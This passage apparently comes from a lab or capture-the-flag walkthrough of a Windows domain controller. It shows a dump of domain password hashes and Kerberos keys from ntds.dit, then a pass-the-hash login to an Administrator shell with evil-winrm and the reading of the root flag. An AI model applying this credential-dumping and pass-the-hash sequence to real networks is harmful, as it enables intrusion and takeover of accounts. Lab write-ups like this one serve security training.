krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
[*] Cleaning up...
```

Admin: `aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d`

## Administrator shell
```
❯ evil-winrm -i BABYDC.baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root.txt
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```